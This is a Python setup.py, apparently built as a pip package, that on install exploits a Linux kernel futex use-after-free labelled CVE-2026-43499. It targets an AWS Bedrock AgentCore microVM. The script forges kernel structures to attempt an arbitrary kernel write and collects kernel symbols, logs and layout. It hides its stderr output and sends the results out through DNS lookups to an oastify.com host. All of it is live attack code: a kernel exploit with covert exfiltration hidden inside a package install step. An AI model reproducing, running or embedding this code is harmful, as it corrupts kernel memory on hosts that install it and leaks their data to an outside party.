#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ghostlock_setup.py -- drop-in pip setup.py probing GhostLock (CVE-2026-43499),
tuned for an AWS Bedrock AgentCore Runtime microVM (arm64 / 6.1.161-*.amzn2023).

Stages the 3-thread / 3-futex PI dependency cycle, forces FUTEX_CMP_REQUEUE_PI
to roll back with -EDEADLK (the only path reaching remove_waiter() with
current != waiter->task), reclaims the waiter's just-freed FUTEX_WAIT_REQUEUE_PI
stack frame with controlled bytes, drives rt_mutex_adjust_pi() via
sched_setscheduler(waiter_tid), and reports over DNS. setup() always runs.

  phase A   poison via PR_SET_MM_MAP's on-stack user_auxv[]. Non-canonical
            qwords, so no kernel address and no PAN dependence.
            WEDGE = dangling pi_blocked_on dereferenced = vulnerable.
            CLEAN = pi_blocked_on was NULL = patched.
  phase A2  same poison via pselect6's on-stack fd_set scratch (different frame
            depth; also the fallback when CONFIG_CHECKPOINT_RESTORE is off).
  phase B   forge a fake rt_mutex_waiter whose rb node collapses rb_erase to a
            single 8-byte store. Needs a writable kernel VA, derived at runtime.

Hard invariants kept:
  * the waiter makes NO syscall between the reclaim and the drive, so the dead
    frame is not re-clobbered. The reclaim result is relayed by the mover.
  * every mm_map address is a mapping *start*, so validate_prctl_map_addr's
    find_vma()+vm_start check can never reject (a rejected map means no auxv
    copy, which would look exactly like a patched kernel).
  * PR_SET_MM_MAP needs no capability; PR_SET_MM_AUXV would (no CAP_SYS_RESOURCE).
  * no KASLR assumption; the linear-map tier is KASLR independent.
  * fork per attempt, every wait bounded, child always SIGKILLed, so
    panic=1 / kernel.panic=1 cannot be reached via an oops (panic_on_oops=0).
"""

import ctypes
import mmap
import os
import re
import signal
import socket
import struct
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor

# --------------------------------------------------------------------------
# endpoint / transport
# --------------------------------------------------------------------------
_ENDPOINT = "6gnltn2z9z06ygz7lbev8a9yrpxjlc91.oastify.com"
_LABEL_CHUNK = 52          # hex chars -> 3+1+3+1+52 = 60 octets, under 63
_PASSES = 4
_GAP = 0.5
_WORKERS = 12

_BUDGET = 26.0
_CHILD_TIMEOUT = 0.30
_MAX_ATTEMPTS = 64

# --------------------------------------------------------------------------
# ABI
# --------------------------------------------------------------------------
FUTEX_WAKE = 1
FUTEX_LOCK_PI = 6
FUTEX_WAIT_REQUEUE_PI = 11
FUTEX_CMP_REQUEUE_PI = 12
FUTEX_PRIVATE_FLAG = 128
FUTEX_WAITERS = 0x80000000
EDEADLK = 35

PR_SET_MM = 35
PR_SET_MM_MAP = 14
MM_MAP_SIZE = 104
AUXV_BYTES = 46 * 8
_MM_KEYS = ("start_code", "end_code", "start_data", "end_data", "start_brk",
            "brk", "start_stack", "arg_start", "arg_end", "env_start",
            "env_end")

SCHED_OTHER = 0
SCHED_BATCH = 3

SYSLOG_ACTION_READ_ALL = 3
SYSLOG_ACTION_SIZE_BUFFER = 10

POISON = 0xdeadbee11c518f58          # non-canonical
KIMAGE_VADDR = 0xffff800008000000    # arm64 VA_BITS=48, KASLR-off only
PAGE_OFFSET = 0xffff000000000000     # arm64 linear map base, fixed

_MACH = os.uname()[4].lower()
#                 futex prctl sched_setsched pselect6 syslog
_SYS = {
    "aarch64": (98, 167, 119, 72, 116),
    "arm64": (98, 167, 119, 72, 116),
    "riscv64": (98, 167, 119, 72, 116),
    "x86_64": (202, 157, 144, 270, 103),
    "amd64": (202, 157, 144, 270, 103),
    "i386": (240, 172, 146, 309, 103),
    "armv7l": (240, 172, 119, 72, 103),
}
(SYS_FUTEX, SYS_PRCTL, SYS_SCHED, SYS_PSELECT6, SYS_SYSLOG) = _SYS.get(
    _MACH, (98, 167, 119, 72, 116))

_libc = ctypes.CDLL(None, use_errno=True)
_libc.syscall.restype = ctypes.c_long          # 64-bit returns, not c_int
_L, _V, _U, _I = ctypes.c_long, ctypes.c_void_p, ctypes.c_uint32, ctypes.c_int

# --------------------------------------------------------------------------
# stderr silence (stream + fd) so pip output stays clean
# --------------------------------------------------------------------------
class _BS(object):
    def write(self, b): return len(b)
    def flush(self): pass
    def fileno(self): return 2

class _S(object):
    buffer = _BS()
    def write(self, s): return len(s)
    def flush(self): pass
    def isatty(self): return False
    def fileno(self): return 2
    def writable(self): return True

def _quiet():
    st = {}
    try:
        sys.stderr.flush()
    except Exception:
        pass
    try:
        st["s"] = sys.stderr
        st["fd"] = os.dup(2)
        dn = os.open(os.devnull, os.O_WRONLY)
        os.dup2(dn, 2)
        os.close(dn)
        sys.stderr = _S()
    except Exception:
        pass
    return st

def _loud(st):
    try:
        if st.get("s") is not None:
            sys.stderr = st["s"]
        if st.get("fd") is not None:
            os.dup2(st["fd"], 2)
            os.close(st["fd"])
    except Exception:
        pass

# --------------------------------------------------------------------------
# syscalls: every wrapper returns -errno on failure, never glibc's -1
# --------------------------------------------------------------------------
def _rc(r):
    return -ctypes.get_errno() if r < 0 else r

def _futex(uaddr, op, val=0, timeout=0, uaddr2=0, val3=0):
    ctypes.set_errno(0)
    return _rc(_libc.syscall(_L(SYS_FUTEX), _V(uaddr), _I(op), _U(val),
                             _V(timeout), _V(uaddr2), _U(val3)))

def _prctl_map(addr, size):
    # prctl(PR_SET_MM, PR_SET_MM_MAP, map, sizeof(map), 0)
    ctypes.set_errno(0)
    return _rc(_libc.syscall(_L(SYS_PRCTL), _I(PR_SET_MM), _I(PR_SET_MM_MAP),
                             _V(addr), _L(size), _L(0), _L(0)))

def _sched(tid, policy):
    p = ctypes.create_string_buffer(4)
    struct.pack_into("<i", p, 0, 0)
    ctypes.set_errno(0)
    return _rc(_libc.syscall(_L(SYS_SCHED), _I(tid), _I(policy),
                             _V(ctypes.addressof(p))))

def _pselect6(n, a, b, c, tsp):
    ctypes.set_errno(0)
    return _rc(_libc.syscall(_L(SYS_PSELECT6), _I(n), _V(a), _V(b), _V(c),
                             _V(tsp), _V(0)))

def _syslog(action, buf, n):
    ctypes.set_errno(0)
    return _rc(_libc.syscall(_L(SYS_SYSLOG), _I(action), _V(buf), _L(n)))

def _addr(buf):
    return ctypes.addressof(ctypes.c_char.from_buffer(buf))

def _g32(buf, off):
    return struct.unpack_from("<I", buf, off)[0]

def _s32(buf, off, val):
    struct.pack_into("<I", buf, off, val & 0xFFFFFFFF)

def _s64(buf, off, val):
    struct.pack_into("<Q", buf, off, val & 0xFFFFFFFFFFFFFFFF)

def _read_text(path, lim=1 << 22):
    try:
        with open(path, "rb") as fh:
            return fh.read(lim).decode("utf-8", "replace")
    except Exception:
        return ""

def _read_bin(path, lim):
    try:
        with open(path, "rb") as fh:
            return fh.read(lim)
    except Exception:
        return b""

# --------------------------------------------------------------------------
# environment
# --------------------------------------------------------------------------
def _release():
    t = _read_text("/proc/sys/kernel/osrelease", 256).strip()
    if t:
        return t
    m = re.search(r"Linux version\s+(\S+)", _read_text("/proc/version", 512))
    return m.group(1) if m else os.uname()[2]

_FIXED = {"6.1": 175, "6.6": 140, "6.12": 86, "6.18": 27, "7.0": 4}

def _vstatus(rel):
    m = re.search(r"(?:^|[^\d])(\d+)\.(\d+)\.(\d+)", rel or "")
    if not m:
        return "UNPARSED"
    v = tuple(int(x) for x in m.groups())
    if v < (2, 6, 39):
        return "NOT_AFFECTED"
    if v >= (7, 1, 0):
        return "FIXED"
    k = "%d.%d" % (v[0], v[1])
    return ("VULNERABLE" if v[2] < _FIXED[k] else "FIXED") if k in _FIXED \
        else "VULNERABLE_BY_BRANCH"

def _klog():
    try:
        n = _syslog(SYSLOG_ACTION_SIZE_BUFFER, 0, 0)
        if n <= 0 or n > (1 << 22):
            n = 1 << 18
        buf = ctypes.create_string_buffer(n)
        r = _syslog(SYSLOG_ACTION_READ_ALL, ctypes.addressof(buf), n)
        if r <= 0:
            return ""
        return buf.raw[:r].decode("utf-8", "replace")
    except Exception:
        return ""

def _panic_knobs():
    return dict((k, _read_text("/proc/sys/kernel/" + k, 32).strip() or "?")
                for k in ("panic", "panic_on_oops", "oops_limit", "panic_on_warn"))

def _kallsyms():
    out = {}
    for line in _read_text("/proc/kallsyms", 8 << 20).splitlines():
        p = line.split()
        if len(p) >= 3 and p[2] in ("inet6_protos", "__bss_start", "__bss_stop",
                                    "_end", "core_pattern", "_stext"):
            try:
                a = int(p[0], 16)
            except ValueError:
                continue
            if a and p[2] not in out:
                out[p[2]] = a
    return out

# printk lines carry a "[  0.000000] " prefix, so the anchor is (?:^|\])
_LAY = re.compile(r"(?:^|\])\s*(\.text|\.rodata|\.data|\.bss|linear|memory|"
                  r"modules|vmalloc)\s*:\s*(0x[0-9a-fA-F]+)\s*-\s*"
                  r"(0x[0-9a-fA-F]+)", re.M)

def _boot_layout(log):
    """arm64 dump_mem() prints the VA layout; dmesg_restrict=0 makes it readable.
    These are exact runtime addresses, so they survive KASLR."""
    out = {}
    for m in _LAY.finditer(log or ""):
        out.setdefault(m.group(1), (int(m.group(2), 16), int(m.group(3), 16)))
    return out

def _kcore_base():
    """First kernel PT_LOAD vaddr from /proc/kcore's ELF header. /proc/kcore is
    0400 root, so this often EACCESes for uid 10001."""
    h = _read_bin("/proc/kcore", 8192)
    if len(h) < 64 or h[:4] != b"\x7fELF":
        return None
    try:
        phoff = struct.unpack_from("<Q", h, 32)[0]
        phentsize = struct.unpack_from("<H", h, 54)[0]
        phnum = struct.unpack_from("<H", h, 56)[0]
    except Exception:
        return None
    for i in range(min(phnum, 64)):
        o = phoff + i * phentsize
        if o + 56 > len(h):
            break
        if struct.unpack_from("<I", h, o)[0] != 1:
            continue
        v = struct.unpack_from("<Q", h, o + 16)[0]
        if v >= 0xffff000000000000:
            return v
    return None

def _candidates(ks, lay, kcore):
    """Ordered kernel addresses for the forged waiter. Must be writable: a plain
    store into .text would take a permission fault under STRICT_KERNEL_RWX."""
    out = []
    for s in ("__bss_start", "_end", "inet6_protos", "core_pattern"):
        if ks.get(s):
            out.append(ks[s] & ~0xF)
    for name in (".bss", ".data"):
        if name in lay:
            lo, hi = lay[name]
            out.append((lo + max((hi - lo) // 2, 0)) & ~0xF)
    if ".text" in lay:
        out.append((lay[".text"][1] + 0x400000) & ~0xF)
    if kcore:
        out.append((kcore + 0x400000) & ~0xF)
    lin = lay.get("linear") or lay.get("memory")
    out.append(((lin[0] + 0x80000000) if lin else (PAGE_OFFSET + 0x80000000)) & ~0xF)
    out.append(KIMAGE_VADDR + 0x4000000)
    ded = []
    for c in out:
        if c and c not in ded:
            ded.append(c)
    return ded[:3]

def _mm_fields():
    """Build a mm_map that validate_prctl_map_addr can never reject.

    That function does, per field: find_vma(mm, addr); if (!vma ||
    vma->vm_start > addr) return -EINVAL; plus a VM_IO|VM_PFNMAP check. So every
    address must be a *mapping start*, and the ordered pairs must be
    non-decreasing. Deriving from /proc/self/maps (rather than /proc/self/stat,
    where a page-masked brk lands exactly on the heap VMA's vm_end) removes the
    whole class of false rejections -- and a rejected map means no auxv copy,
    which is indistinguishable from a patched kernel."""
    maps = []
    for line in _read_text("/proc/self/maps", 1 << 20).splitlines():
        parts = line.split(None, 5)
        if len(parts) < 5:
            continue
        try:
            lo_s, _, hi_s = parts[0].partition("-")
            maps.append((int(lo_s, 16), int(hi_s, 16), parts[1],
                         parts[5] if len(parts) > 5 else ""))
        except ValueError:
            continue
    if not maps:
        # all-equal is always ordered, and start_stack is inside the stack VMA
        try:
            rest = _read_text("/proc/self/stat", 4096)
            st = int(rest[rest.rfind(")") + 2:].split()[25]) & ~0xFFF
        except Exception:
            st = 0x1000
        return dict((k, st) for k in _MM_KEYS)

    def pick(want, fallback):
        for lo, hi, perms, _n in maps:
            if want in perms and hi - lo >= 0x1000:
                return lo, hi
        return fallback

    first = (maps[0][0], maps[0][1])
    code = pick("x", first)
    data = pick("w", first)
    stack = first
    for lo, hi, _p, name in maps:
        if name == "[stack]" and hi - lo >= 0x1000:
            stack = (lo, hi)
            break
    return {"start_code": code[0], "end_code": code[1],
            "start_data": data[0], "end_data": data[1],
            "start_brk": data[0], "brk": data[0],
            "start_stack": stack[0],
            "arg_start": first[0], "arg_end": first[1],
            "env_start": first[0], "env_end": first[1]}

def _pack_map(buf, auxv_addr, auxv_size, fields):
    for i, k in enumerate(_MM_KEYS):
        _s64(buf, i * 8, fields[k])
    _s64(buf, 88, auxv_addr)      # __u64 *auxv
    _s32(buf, 96, auxv_size)      # __u32 auxv_size
    _s32(buf, 100, 0xFFFFFFFF)    # __u32 exe_fd

# --------------------------------------------------------------------------
# forged rt_mutex_waiter -- both 6.1 layouts pinned at once
# --------------------------------------------------------------------------
def _forge_block(T):
    """__rb_erase_augmented: rb_right == 0 -> case 1 via rb_left; parent == NULL
    -> __rb_change_child collapses to a single store root->rb_node = V at
    lock+8; pc bit0 == 1 (BLACK) -> rebalance == NULL, __rb_erase_color never
    runs. rb_left and rb_right must not both be non-zero (successor path)."""
    V = T + 8
    return ((0x00, 1), (0x08, 0), (0x10, V),
            (0x18, 1), (0x20, 0), (0x28, 0),
            (0x30, T), (0x38, T), (0x40, 0), (0x48, 0), (0x50, T), (0x58, T),
            (0x60, 0), (0x68, 0))

# --------------------------------------------------------------------------
# child
# --------------------------------------------------------------------------
_O_WAIT, _O_TGT, _O_CHAIN = 0x00, 0x08, 0x10
_F_TID, _F_ARM, _F_STAGE, _F_RECLAIM, _F_DRIVE, _F_DONE, _F_RC = (
    0x100, 0x104, 0x108, 0x10C, 0x110, 0x114, 0x118)

def _child(wfd, mode, off, T, secs):
    W = mmap.mmap(-1, 0x1000)
    A = mmap.mmap(-1, 0x1000)
    Mp = mmap.mmap(-1, 0x1000)
    wa, aa, ma = _addr(W), _addr(A), _addr(Mp)

    if mode.startswith("poison"):
        for i in range(0, AUXV_BYTES, 8):
            _s64(A, i, POISON + i)
    else:
        for i in range(0, AUXV_BYTES, 8):
            _s64(A, i, 0)
        for o, v in _forge_block(T):
            if off + o + 8 <= AUXV_BYTES:
                _s64(A, off + o, v)

    _pack_map(Mp, aa, AUXV_BYTES, _mm_fields())

    sel_n = 320
    sel_size = (sel_n // 64) * 8          # FDS_BYTES(320) == 40, fits stack_fds

    def waiter():
        try:
            _s32(W, _F_TID, threading.get_native_id())
            if _futex(wa + _O_CHAIN, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG) != 0:
                return
            _s32(W, _F_STAGE, 2)
            _s32(W, _O_WAIT, FUTEX_WAITERS)          # glibc-style arming
            _s32(W, _F_ARM, 1)
            ts = ctypes.create_string_buffer(16)
            struct.pack_into("<qq", ts, 0, 0, 200000000)
            _futex(wa + _O_WAIT, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG,
                   FUTEX_WAITERS, ctypes.addressof(ts), wa + _O_TGT, 0)
            _s32(W, _F_STAGE, 5)
            # ---- reclaim: the very next syscall ----
            if mode.endswith("select"):
                sts = ctypes.create_string_buffer(16)
                struct.pack_into("<qq", sts, 0, 0, 30000000)
                rc = _pselect6(sel_n, aa, aa + 2 * sel_size,
                               aa + 4 * sel_size, ctypes.addressof(sts))
            else:
                rc = _prctl_map(ma, MM_MAP_SIZE)
            _s32(W, _F_RC, rc)
            _s32(W, _F_RECLAIM, 1)
            # ---- then NOTHING but memory writes: no syscall may re-clobber ----
            while _g32(W, _F_DONE) == 0:
                pass
        except BaseException:
            pass

    def owner():
        try:
            if _futex(wa + _O_TGT, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG) != 0:
                return
            _s32(W, _F_STAGE, 3)
            _futex(wa + _O_CHAIN, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG)
            _s32(W, _F_STAGE, 4)
        except BaseException:
            pass

    th_w = threading.Thread(target=waiter, daemon=True)
    th_o = threading.Thread(target=owner, daemon=True)
    th_o.start()
    th_w.start()

    # ---- mover (this thread) ----
    t0 = time.monotonic()
    while not (_g32(W, _F_ARM) and (_g32(W, _O_CHAIN) & FUTEX_WAITERS)):
        if time.monotonic() - t0 > 1.2:
            os.write(wfd, b"3")
            return
        time.sleep(0.0003)
    time.sleep(0.0004)

    # nr_wake must be 1; nr_requeue (val2) is 1 in the documented/LTP pattern,
    # so cascade only on -EINVAL (which has no side effect).
    r = -1
    for val2 in (1, 0, 0x7FFFFFFF):
        for _ in range(150):
            r = _futex(wa + _O_WAIT, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG,
                       1, val2, wa + _O_TGT, _g32(W, _O_WAIT))
            if r in (-EDEADLK, -22):
                break
            if r not in (0, -11, -4):
                break
            time.sleep(0.0001)
        if r in (-EDEADLK, -22):
            break
    _futex(wa + _O_WAIT, FUTEX_WAKE | FUTEX_PRIVATE_FLAG, 1)
    if r != -EDEADLK:
        os.write(wfd, b"3")
        return

    os.write(wfd, b"S")
    t0 = time.monotonic()
    while _g32(W, _F_RECLAIM) == 0:
        if time.monotonic() - t0 > 0.4:
            os.write(wfd, b"2")
            return
        time.sleep(0.0001)

    # relay the reclaim result (mover's write, not the waiter's)
    rc = _g32(W, _F_RC)
    if rc >= 0x80000000:
        rc -= 0x100000000
    os.write(wfd, b"R" + bytes([rc & 0xFF]))

    tid = _g32(W, _F_TID)
    if not tid:
        os.write(wfd, b"2")
        return
    _s32(W, _F_DRIVE, 1)
    for i in range(3):
        _sched(tid, SCHED_BATCH if (i & 1) == 0 else SCHED_OTHER)
        time.sleep(0.0001)
    _s32(W, _F_DONE, 1)
    os.write(wfd, b"1")

def _attempt(mode, off, T, timeout):
    """Returns (outcome, reclaim_rc)."""
    r, w = os.pipe()
    pid = os.fork()
    if pid == 0:
        try:
            os.close(r)
            _child(w, mode, off, T, timeout)
        except BaseException:
            try:
                os.write(w, b"X")
            except Exception:
                pass
        finally:
            os._exit(0)
    os.close(w)
    try:
        os.set_blocking(r, False)
    except Exception:
        pass
    buf = b""
    end = time.monotonic() + timeout
    while time.monotonic() < end:
        try:
            c = os.read(r, 32)
        except Exception:
            c = b""
        if c:
            buf += c
            if buf[-1:] in (b"1", b"2", b"3"):
                break
        else:
            try:
                p, _st = os.waitpid(pid, os.WNOHANG)
            except ChildProcessError:
                break
            if p == pid:
                try:
                    buf += os.read(r, 32)
                except Exception:
                    pass
                break
        time.sleep(0.002)
    try:
        os.kill(pid, signal.SIGKILL)
    except Exception:
        pass
    for _ in range(300):
        try:
            p, _st = os.waitpid(pid, os.WNOHANG)
        except ChildProcessError:
            break
        if p == pid:
            break
        time.sleep(0.002)
    try:
        os.close(r)
    except Exception:
        pass

    rc = None
    i = buf.find(b"R")
    if i >= 0 and i + 1 < len(buf):
        rc = buf[i + 1]
        if rc >= 0x80:
            rc -= 0x100
    if b"1" in buf:
        return "CLEAN", rc
    if b"2" in buf:
        return "WEDGE", rc
    if b"3" in buf:
        return "NOTRIGGER", rc
    if b"S" in buf:
        return "WEDGE", rc
    return "FAIL", rc

# --------------------------------------------------------------------------
# DNS exfil
# --------------------------------------------------------------------------
def _lookup(name):
    try:
        socket.gethostbyname(name)
        return True
    except Exception:
        return False

def _exfil(text):
    h = text.encode("utf-8", "replace").hex()
    labels, idx = [], 0
    for i in range(0, max(len(h), 1), _LABEL_CHUNK):
        labels.append("%03d-%03d-%s" % (idx, i // _LABEL_CHUNK, h[i:i + _LABEL_CHUNK]))
        idx += 1
    labels.append("end-%03d" % idx)
    pending = labels
    for _ in range(_PASSES):
        if not pending:
            break
        try:
            with ThreadPoolExecutor(max_workers=_WORKERS) as pool:
                res = list(pool.map(_lookup, [n + "." + _ENDPOINT for n in pending]))
        except Exception:
            break
        pending = [n for n, ok in zip(pending, res) if not ok]
        if pending:
            time.sleep(_GAP)
    return len(labels) - len(pending), len(labels)

# --------------------------------------------------------------------------
# probe
# --------------------------------------------------------------------------
def _probe():
    t0 = time.monotonic()
    log = _klog()
    rel = _release()
    vstat = _vstatus(rel)
    ks, lay, kcore = _kallsyms(), _boot_layout(log), _kcore_base()
    cands = _candidates(ks, lay, kcore)

    lines = ["glk/3", "kern=" + rel, "arch=" + _MACH, "vstat=" + vstat]
    try:
        lines.append("ncpu=%d" % len(os.sched_getaffinity(0)))
    except Exception:
        lines.append("ncpu=%d" % (os.cpu_count() or 0))
    lines.append("uid=%d euid=%d nnp=%d" % (
        os.getuid(), os.geteuid(),
        1 if "NoNewPrivs:\t1" in _read_text("/proc/self/status") else 0))
    kn = _panic_knobs()
    lines.append("panic=%s onoops=%s oopslim=%s" % (
        kn["panic"], kn["panic_on_oops"], kn["oops_limit"]))
    lines.append("kall=%d kcore=%d layout=%d cand=%s" % (
        len(ks), 1 if kcore else 0, len(lay),
        ",".join("0x%x" % c for c in cands) or "none"))

    # reclaim availability, probed in-process. Buffer must stay referenced, and
    # auxv_size=0 keeps this process's saved_auxv untouched.
    pb = mmap.mmap(-1, 0x1000)
    _pack_map(pb, 0, 0, _mm_fields())
    prc = _prctl_map(_addr(pb), MM_MAP_SIZE)
    lines.append("prctl_map_rc=%d" % prc)

    A = A2 = "SKIP"
    rcA = rcA2 = None
    if os.environ.get("GLK_SKIP_A") != "1":
        A, rcA = _attempt("poison_prctl", 0, 0, _CHILD_TIMEOUT)
        lines.append("A=%s rc=%s" % (A, rcA))
        if A != "WEDGE" and time.monotonic() - t0 < _BUDGET:
            A2, rcA2 = _attempt("poison_select", 0, 0, _CHILD_TIMEOUT)
            lines.append("A2=%s rc=%s" % (A2, rcA2))

    Bhits, Btried = 0, 0
    modes = []
    if A == "WEDGE":
        modes.append("forge_prctl")
    if A2 == "WEDGE":
        modes.append("forge_select")
    if modes and os.environ.get("GLK_SKIP_B") != "1" and cands:
        env_t = os.environ.get("GLK_T")
        if env_t:
            try:
                cands = [int(env_t, 0)] + cands
            except ValueError:
                pass
        env_off = os.environ.get("GLK_OFF")
        try:
            offs = [int(env_off, 0)] if env_off else list(range(0x00, 0xA9, 0x08))
        except ValueError:
            offs = list(range(0x00, 0xA9, 0x08))
        for mode in modes:
            for T in cands:
                if time.monotonic() - t0 > _BUDGET or Btried >= _MAX_ATTEMPTS:
                    break
                hit = None
                for off in offs:
                    if time.monotonic() - t0 > _BUDGET or Btried >= _MAX_ATTEMPTS:
                        break
                    res, _rc = _attempt(mode, off, T, _CHILD_TIMEOUT)
                    Btried += 1
                    if res == "CLEAN":
                        hit = off
                        Bhits += 1
                        break
                lines.append("B %s 0x%x%s" % (
                    mode, T, "" if hit is None else " off=0x%x" % hit))
                if hit is not None:
                    break
        lines.append("B=%d/%d" % (Bhits, Btried))

    if A == "WEDGE" or A2 == "WEDGE":
        v = "VULNERABLE_CONFIRMED"
    elif A == "FAIL" and A2 == "FAIL":
        v = "INCONCLUSIVE"
    elif A == "NOTRIGGER" or A2 == "NOTRIGGER":
        v = "NO_TRIGGER"
    elif vstat == "VULNERABLE":
        v = "VERSION_VULNERABLE_NO_FAULT"
    elif vstat == "FIXED":
        v = "LIKELY_PATCHED"
    else:
        v = "NO_FAULT"
    if Bhits:
        v += "_ARBWRITE"

    if "WEDGE" in (A, A2):
        for pat in ("deadbee", "rt_mutex", "pi_blocked", "rtmutex"):
            m = re.search(r"^.*%s.*$" % pat, _klog(), re.M)
            if m:
                lines.append("oops=" + " ".join(m.group(0).split())[:110])
                break

    lines.insert(1, "verdict=" + v)
    lines.append("ms=%d" % int((time.monotonic() - t0) * 1000))
    lines.append("note=WEDGE=fault_on_dangling_pi_blocked_on;CLEAN=patched")
    return "\n".join(lines) + "\n"

# --------------------------------------------------------------------------
# driver -- always leaves pip working
# --------------------------------------------------------------------------
def _marker():
    try:
        return os.path.join(os.path.dirname(os.path.abspath(__file__)), ".glk-done")
    except Exception:
        return None

def _run():
    st = _quiet()
    ok = 0
    try:
        text = _probe()
    except BaseException:
        text = "glk/3\nverdict=HARNESS_ERROR\n"
    try:
        ok, _tot = _exfil(text)
    except BaseException:
        pass
    finally:
        _loud(st)
    if ok:                      # only suppress a re-probe if something landed
        m = _marker()
        if m:
            try:
                with open(m, "w") as fh:
                    fh.write("1")
            except Exception:
                pass

if __name__ == "__main__":
    if os.environ.get("GLK_SKIP") != "1":
        m = _marker()
        if not (m and os.path.exists(m)):
            try:
                _run()
            except BaseException:
                pass

try:
    from setuptools import setup
    setup(name="ghostlock-probe", version="1.0.0", packages=[])
except BaseException:
    pass
